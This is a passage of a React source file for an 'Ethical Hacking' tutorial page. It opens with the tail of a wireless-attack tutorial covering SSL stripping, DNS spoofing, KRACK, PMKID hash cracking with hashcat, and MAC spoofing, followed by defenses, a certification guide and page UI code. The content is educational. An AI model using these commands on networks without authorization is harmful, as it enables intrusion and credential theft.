**SSL Stripping:**
Use sslstrip to downgrade HTTPS to HTTP
Capture credentials in clear text

**DNS Spoofing:**
Redirect domains to malicious IPs
Serve fake login pages

**Advanced Techniques:**

**KRACK Attack (Key Reinstallation Attack):**
Exploits WPA2 4-way handshake
Forces nonce reuse
Decrypts packets

**PMKID Attack:**
Newer technique requiring only one frame
No client needed
hashcat -m 22000 pmkid.hccapx wordlist.txt

**Hidden SSID Discovery:**
sudo airodump-ng --channel 6 wlan0mon
Wait for client connection to reveal SSID

**MAC Address Filtering Bypass:**
Observe authorized MAC addresses
Change your MAC: sudo macchanger -m AA:BB:CC:DD:EE:FF wlan0

**Defense Measures:**

**For Network Owners:**
1. Use WPA3 if available
2. Strong passwords (12+ characters)
3. Disable WPS
4. Hide SSID (minor security)
5. Enable MAC filtering (minor security)
6. Regular firmware updates
7. Use VPN for sensitive data
8. Monitor for rogue access points
9. Implement 802.1X for enterprise
10. Use strong pre-shared keys

**For Users:**
1. Avoid public WiFi for sensitive tasks
2. Use VPN on untrusted networks
3. Verify network authenticity
4. Keep devices updated
5. Disable auto-connect
6. Use HTTPS everywhere

**Legal Considerations:**
- Only test networks you own or have authorization
- Wireless attacks can affect neighbors
- Many countries have strict laws against unauthorized access
- Always get written permission for penetration testing`
    },
    {
      id: 12,
      title: 'Security Certifications Guide 2025',
      category: 'Certifications',
      difficulty: 'All Levels',
      duration: '30 min',
      views: '24.6K',
      icon: BookOpen,
      color: 'from-green-600 to-teal-600',
      excerpt: 'Complete guide to cybersecurity certifications: CEH, OSCP, CISSP, and more.',
      popular: true,
      topics: ['CEH', 'OSCP', 'CISSP', 'Security+'],
      content: `Cybersecurity certifications validate your skills and knowledge. This guide covers the most valuable certifications for different career paths and experience levels.

**Entry-Level Certifications:**

**CompTIA Security+ (Sec+)**
**Cost:** $392
**Difficulty:** Beginner
**Prerequisites:** None (A+ and Network+ recommended)
**Format:** 90 questions, 90 minutes
**Topics:** Threats, vulnerabilities, cryptography, identity management, risk management
**Best For:** Starting IT security career, government jobs (meets DoD 8570 requirements)
**Study Time:** 2-3 months
**Salary Impact:** $60k-$75k

**CEH (Certified Ethical Hacker)**
**Cost:** $1,199 (exam), training optional
**Difficulty:** Beginner-Intermediate
**Prerequisites:** None officially (2 years experience or training)
**Format:** 125 questions, 4 hours
**Topics:** Reconnaissance, scanning, enumeration, system hacking, web app security
**Best For:** Aspiring penetration testers, SOC analysts
**Study Time:** 3-4 months
**Criticism:** Theory-heavy, multiple choice only
**Salary Impact:** $70k-$90k

**Intermediate Certifications:**

**OSCP (Offensive Security Certified Professional)**
**Cost:** $1,649 (includes lab time and exam)
**Difficulty:** Intermediate-Advanced
**Prerequisites:** Strong Linux/networking knowledge, basic programming
**Format:** 24-hour practical exam (compromise 5 machines)
**Topics:** Buffer overflows, web app attacks, privilege escalation, Active Directory
**Best For:** Penetration testers, red teamers
**Study Time:** 6-12 months
**Reputation:** Highly respected, practical hands-on
**Salary Impact:** $85k-$120k
**Try Harder:** Famous for challenging format

**GIAC Security Essentials (GSEC)**
**Cost:** $2,499 (exam + 4-month practice tests)
**Difficulty:** Intermediate
**Prerequisites:** Basic security knowledge
**Format:** 106-180 questions, 4-5 hours, open book
**Topics:** Defense, network security, cryptography, incident response
**Best For:** Security administrators, defense roles
**Study Time:** 3-6 months
**Salary Impact:** $75k-$100k

**Advanced Certifications:**

**CISSP (Certified Information Systems Security Professional)**
**Cost:** $749
**Difficulty:** Advanced
**Prerequisites:** 5 years security experience (or 4 with degree)
**Format:** 100-150 questions, 3 hours, CAT format
**Topics:** 8 domains covering all security aspects
**Best For:** Security managers, architects, consultants
**Study Time:** 6-12 months
**Reputation:** "Gold standard" for security professionals
**Salary Impact:** $100k-$150k+

**OSEP (Offensive Security Experienced Penetration Tester)**
**Cost:** $1,999 (includes 90 days lab + exam)
**Difficulty:** Advanced
**Prerequisites:** OSCP or equivalent experience
**Format:** 48-hour exam + 24-hour report
**Topics:** Evasion techniques, advanced Active Directory, custom tools
**Best For:** Senior penetration testers
**Study Time:** 6-12 months with OSCP background
**Salary Impact:** $100k-$140k

**OSWE (Offensive Security Web Expert)**
**Cost:** $1,649
**Difficulty:** Advanced
**Prerequisites:** Strong web app knowledge, programming
**Format:** 48-hour exam
**Topics:** White-box web app testing, code review, custom exploits
**Best For:** Web application penetration testers
**Study Time:** 6-12 months
**Salary Impact:** $95k-$130k

**Specialized Certifications:**

**GCIH (GIAC Certified Incident Handler)**
**Focus:** Incident response, forensics
**Cost:** $2,499
**Best For:** SOC analysts, incident responders

**GPEN (GIAC Penetration Tester)**
**Focus:** Penetration testing methodologies
**Cost:** $2,499
**Best For:** Penetration testers

**GWAPT (GIAC Web Application Penetration Tester)**
**Focus:** Web application security
**Cost:** $2,499
**Best For:** Web app security specialists

**Cloud Security:**
- AWS Certified Security - Specialty
- Azure Security Engineer Associate
- Google Cloud Professional Security Engineer

**Career Path Recommendations:**

**Penetration Testing Path:**
1. Security+ or CEH (entry)
2. OSCP (must-have)
3. OSEP or OSWE (advanced)
4. Consider GPEN, GWAPT

**Security Management Path:**
1. Security+ (entry)
2. CISSP (management focus)
3. CISM or CISA (optional)

**SOC Analyst Path:**
1. Security+
2. CySA+ or GCIH
3. GCIA (advanced)

**Cloud Security Path:**
1. Security+
2. Cloud-specific certs (AWS/Azure/GCP)
3. CCSP (advanced)

**Certification Tips:**

**Before Choosing:**
- Research job postings in your area
- Consider your career goals
- Evaluate cost vs. benefit
- Check employer reimbursement policies

**Study Strategies:**
- Hands-on practice is essential
- Join study groups
- Use multiple resources
- Take practice exams
- Build a home lab
- Document your learning

**Maintaining Certifications:**
Most require CPE (Continuing Professional Education):
- CISSP: 120 CPEs over 3 years
- OSCP: No renewal required
- CEH: 120 ECEs over 3 years
- Security+: 50 CEUs over 3 years

**Return on Investment:**
Consider:
- Exam cost + study materials
- Time investment
- Salary increase potential
- Job opportunities unlocked
- Employer requirements

**Final Recommendations:**
- Start with Security+ for foundation
- Get OSCP if pursuing pentesting
- CISSP for management/architecture
- Practical certs (Offensive Security) > theory
- Experience > certifications (but both are valuable)
- Choose based on career goals, not prestige alone`
    },
  ];

  const resources = [
    {
      name: 'HackTheBox',
      description: 'Practice penetration testing in realistic environments',
      url: 'https://hackthebox.com',
      color: 'from-green-500 to-emerald-500',
      icon: '🎯'
    },
    {
      name: 'TryHackMe',
      description: 'Learn cybersecurity through gamified challenges',
      url: 'https://tryhackme.com',
      color: 'from-red-500 to-pink-500',
      icon: '🎮'
    },
    {
      name: 'PortSwigger Academy',
      description: 'Free web security training from Burp Suite creators',
      url: 'https://portswigger.net/web-security',
      color: 'from-orange-500 to-red-500',
      icon: '🎓'
    },
    {
      name: 'OWASP',
      description: 'Open Web Application Security Project resources',
      url: 'https://owasp.org',
      color: 'from-blue-500 to-indigo-500',
      icon: '🛡️'
    },
  ];

  const filteredTutorials = selectedCategory === 'All'
    ? tutorials
    : tutorials.filter(t => t.category === selectedCategory);

  const getDifficultyColor = (difficulty: string) => {
    switch (difficulty) {
      case 'Beginner': return 'bg-green-100 dark:bg-green-900/30 text-green-700 dark:text-green-400';
      case 'Intermediate': return 'bg-yellow-100 dark:bg-yellow-900/30 text-yellow-700 dark:text-yellow-400';
      case 'Advanced': return 'bg-red-100 dark:bg-red-900/30 text-red-700 dark:text-red-400';
      default: return 'bg-blue-100 dark:bg-blue-900/30 text-blue-700 dark:text-blue-400';
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 dark:bg-gray-900 py-12">
      <div className="max-w-7xl mx-auto px-4">
        {/* Header */}
        <div className="text-center mb-12 animate-fade-in">
          <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-br from-red-600 to-orange-600 rounded-2xl mb-4">
            <Shield className="w-8 h-8 text-white" />
          </div>
          <h1 className="text-5xl md:text-6xl font-bold text-gray-900 dark:text-white mb-4">
            Ethical Hacking
          </h1>
          <p className="text-xl text-gray-600 dark:text-gray-400 max-w-3xl mx-auto mb-4">
            Learn cybersecurity, penetration testing, and ethical hacking through comprehensive tutorials and hands-on practice
          </p>
          <div className="inline-flex items-center gap-2 px-4 py-2 bg-red-100 dark:bg-red-900/30 border-2 border-red-300 dark:border-red-700 rounded-xl">
            <AlertTriangle className="w-5 h-5 text-red-600 dark:text-red-400" />
            <span className="text-sm font-semibold text-red-800 dark:text-red-300">
              For Educational & Authorized Testing Only
            </span>
          </div>
        </div>

        {/* Category Filter */}
        <div className="flex flex-wrap justify-center gap-3 mb-12 animate-slide-up">
          {categories.map((category) => (
            <button
              key={category}
              onClick={() => setSelectedCategory(category)}
              className={`px-6 py-2.5 rounded-full font-semibold transition-all hover:scale-105 ${
                selectedCategory === category
                  ? 'bg-gradient-to-r from-red-600 to-orange-600 text-white shadow-lg'
                  : 'bg-white dark:bg-gray-800 border-2 border-gray-200 dark:border-gray-700 text-gray-700 dark:text-gray-300 hover:border-red-500'
              }`}
            >
              {category}
            </button>
          ))}
        </div>

        {/* Tutorials Grid */}
        <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-6 mb-16">
          {filteredTutorials.map((tutorial, index) => {
            const Icon = tutorial.icon;
            return (
              <div
                key={tutorial.id}
                onClick={() => setSelectedTutorial(tutorial)}
                className="card p-6 hover:scale-[1.02] transition-transform cursor-pointer animate-scale-in"
                style={{ animationDelay: `${index * 50}ms` }}
              >
                {/* Header */}
                <div className="flex items-start justify-between mb-4">
                  <div className={`w-14 h-14 bg-gradient-to-br ${tutorial.color} rounded-xl flex items-center justify-center shadow-lg`}>
                    <Icon className="w-7 h-7 text-white" />
                  </div>
                  {tutorial.popular && (
                    <span className="inline-flex items-center gap-1 px-3 py-1 bg-gradient-to-r from-yellow-400 to-orange-500 text-white text-xs font-bold rounded-full">
                      <Star className="w-3 h-3" />
                      POPULAR
                    </span>
                  )}
                </div>

                {/* Category & Difficulty */}
                <div className="flex items-center gap-2 mb-3 flex-wrap">
                  <span className="text-xs font-bold px-3 py-1 bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-full">
                    {tutorial.category}
                  </span>
                  <span className={`text-xs font-bold px-3 py-1 rounded-full ${getDifficultyColor(tutorial.difficulty)}`}>
                    {tutorial.difficulty}
                  </span>
                </div>

                {/* Title */}
                <h3 className="text-xl font-bold text-gray-900 dark:text-white mb-2 hover:text-red-600 dark:hover:text-red-400 transition-colors">
                  {tutorial.title}
                </h3>

                {/* Excerpt */}
                <p className="text-gray-600 dark:text-gray-400 text-sm mb-4 leading-relaxed">
                  {tutorial.excerpt}
                </p>

                {/* Topics */}
                <div className="flex flex-wrap gap-2 mb-4">
                  {tutorial.topics.map((topic, i) => (
                    <span key={i} className="text-xs px-2 py-1 bg-gray-50 dark:bg-gray-800 text-gray-600 dark:text-gray-400 rounded">
                      {topic}
                    </span>
                  ))}
                </div>

                {/* Footer */}
                <div className="flex items-center justify-between pt-4 border-t border-gray-100 dark:border-gray-700 text-sm text-gray-500 dark:text-gray-400">
                  <div className="flex items-center gap-3">
                    <div className="flex items-center gap-1">
                      <Clock className="w-4 h-4" />
                      {tutorial.duration}
                    </div>
                    <div className="flex items-center gap-1">
                      <TrendingUp className="w-4 h-4 text-green-500" />
                      {tutorial.views}
                    </div>
                  </div>
                </div>
              </div>
            );
          })}
        </div>

        {/* Learning Resources */}
        <section className="mb-16">
          <div className="text-center mb-12">
            <h2 className="text-4xl font-bold text-gray-900 dark:text-white mb-4">
              Practice Platforms
            </h2>
            <p className="text-xl text-gray-600 dark:text-gray-400">
              Sharpen your skills on these recommended platforms
            </p>
          </div>

          <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-6">
            {resources.map((resource, index) => (
              <a
                key={index}
                href={resource.url}
                target="_blank"
                rel="noopener noreferrer"
                className="card p-6 hover:scale-105 transition-transform group"
              >
                <div className={`w-16 h-16 bg-gradient-to-br ${resource.color} rounded-2xl flex items-center justify-center text-3xl mb-4 group-hover:scale-110 transition-transform shadow-lg`}>
                  {resource.icon}
                </div>
                <h3 className="text-xl font-bold text-gray-900 dark:text-white mb-2 flex items-center gap-2 group-hover:text-red-600 dark:group-hover:text-red-400 transition-colors">
                  {resource.name}
                  <ExternalLink className="w-4 h-4 opacity-0 group-hover:opacity-100 transition-opacity" />
                </h3>
                <p className="text-gray-600 dark:text-gray-400 text-sm">
                  {resource.description}
                </p>
              </a>
            ))}
          </div>
        </section>

        {/* Disclaimer */}
        <div className="card p-8 bg-gradient-to-r from-red-50 to-orange-50 dark:from-red-900/20 dark:to-orange-900/20 border-2 border-red-200 dark:border-red-800">
          <div className="flex items-start gap-4">
            <div className="flex-shrink-0">
              <AlertTriangle className="w-8 h-8 text-red-600 dark:text-red-400" />
            </div>
            <div>
              <h3 className="text-2xl font-bold text-gray-900 dark:text-white mb-3">
                Legal & Ethical Disclaimer
              </h3>
              <div className="text-gray-700 dark:text-gray-300 space-y-2 leading-relaxed">
                <p>
                  <strong>All content is for educational purposes only.</strong> Unauthorized access to computer systems is illegal and punishable by law.
                </p>
                <p>
                  Always obtain proper written authorization before testing any systems. Use these techniques only on:
                </p>
                <ul className="list-disc list-inside space-y-1 ml-4">
                  <li>Your own systems and networks</li>
                  <li>Systems you have explicit written permission to test</li>
                  <li>Authorized penetration testing engagements</li>
                  <li>Legal bug bounty programs</li>
                  <li>Educational lab environments (HackTheBox, TryHackMe, etc.)</li>
                </ul>
                <p className="font-semibold mt-4">
                  DevHub Pro does not condone illegal activities and is not responsible for misuse of this information.
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* CTA */}
        <div className="card p-8 mt-12 text-center bg-gradient-to-r from-red-600 via-orange-600 to-yellow-600 dark:from-red-900 dark:via-orange-900 dark:to-yellow-900 border-none">
          <h2 className="text-3xl font-bold text-white mb-4">
            Want to Contribute?
          </h2>
          <p className="text-lg text-white/90 mb-6">
            Share your ethical hacking tutorials and help others learn cybersecurity
          </p>
          <button
            onClick={openAuthModal}
            className="inline-flex items-center gap-2 px-8 py-4 bg-white text-orange-600 font-bold rounded-xl hover:bg-gray-100 hover:scale-105 transition-all shadow-xl hover:shadow-2xl"
          >
            <BookOpen className="w-5 h-5" />
            Submit Tutorial
          </button>
        </div>

        {/* Tutorial Modal */}
        {selectedTutorial && (
          <div
            className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4 animate-fade-in"
            onClick={() => setSelectedTutorial(null)}
          >
            <div
              className="bg-white dark:bg-gray-800 rounded-2xl max-w-4xl w-full max-h-[90vh] overflow-y-auto animate-scale-in"
              onClick={(e) => e.stopPropagation()}
            >
              <div className={`sticky top-0 bg-gradient-to-r ${selectedTutorial.color} p-6 rounded-t-2xl flex items-center justify-between`}>
                <div className="flex items-center gap-3 flex-wrap">
                  {selectedTutorial.icon && <selectedTutorial.icon className="w-6 h-6 text-white" />}
                  <span className="px-3 py-1 bg-white/20 rounded-full text-xs font-bold text-white">
                    {selectedTutorial.category}
                  </span>
                  <span className={`px-3 py-1 rounded-full text-xs font-bold ${getDifficultyColor(selectedTutorial.difficulty)}`}>
                    {selectedTutorial.difficulty}
                  </span>
                  {selectedTutorial.popular && (
                    <span className="inline-flex items-center gap-1 px-3 py-1 bg-white/20 rounded-full text-xs font-bold text-white">
                      <Star className="w-3 h-3" />
                      POPULAR
                    </span>
                  )}
                </div>
                <button
                  onClick={() => setSelectedTutorial(null)}
                  className="w-8 h-8 flex items-center justify-center bg-white/20 hover:bg-white/30 rounded-full transition text-white"
                >
                  ✕
                </button>
              </div>

              <div className="p-8">
                <h1 className="text-3xl md:text-4xl font-bold text-gray-900 dark:text-white mb-4">
                  {selectedTutorial.title}
                </h1>

                <div className="flex items-center gap-4 mb-6 text-sm text-gray-600 dark:text-gray-400">
                  <div className="flex items-center gap-1">
                    <Clock className="w-4 h-4" />
                    {selectedTutorial.duration}
                  </div>
                  <div className="flex items-center gap-1">
                    <TrendingUp className="w-4 h-4" />
                    {selectedTutorial.views} views
                  </div>
                </div>

                <div className="flex flex-wrap gap-2 mb-6">
                  {selectedTutorial.topics.map((topic: string, i: number) => (
                    <span key={i} className="px-3 py-1 bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-gray-300 text-sm rounded-lg">
                      {topic}
                    </span>
                  ))}
                </div>

                <div className="prose dark:prose-invert max-w-none">
                  <p className="text-gray-600 dark:text-gray-400 mb-6">
                    {selectedTutorial.excerpt}
                  </p>
                  <div className="whitespace-pre-line text-gray-700 dark:text-gray-300 leading-relaxed">
                    {selectedTutorial.content}
                  </div>
                </div>

                <div className="mt-8 pt-6 border-t border-gray-200 dark:border-gray-700">
                  <div className="flex items-center justify-between">
                    <div className="text-sm text-gray-500 dark:text-gray-400">
                      <strong className="text-red-600 dark:text-red-400">Disclaimer:</strong> This content is for educational purposes only. Always obtain proper authorization before testing.
                    </div>
                    <button
                      onClick={() => setSelectedTutorial(null)}
                      className="btn btn-outline"
                    >
                      Close
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
